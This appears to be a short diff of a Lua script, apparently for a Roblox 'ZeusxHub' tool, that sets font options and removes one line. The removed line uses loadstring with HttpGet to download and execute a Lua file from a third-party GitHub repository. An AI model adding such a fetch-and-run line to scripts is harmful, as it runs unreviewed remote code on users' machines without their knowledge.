@@ -19,8 +19,6 @@ local FONT_FOLDER = "ZeusxHub/Fonts"
 local FONT_NAME = "Coiny"
 local FONT_URL = "https://raw.githubusercontent.com/google/fonts/main/ofl/coiny/Coiny-Regular.ttf"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AntomyRider/LuaScript/refs/heads/main/performanceBF.lua"))()
-
 -- State.
 local localPlayer = playersService.LocalPlayer
 local startTime = os.clock()
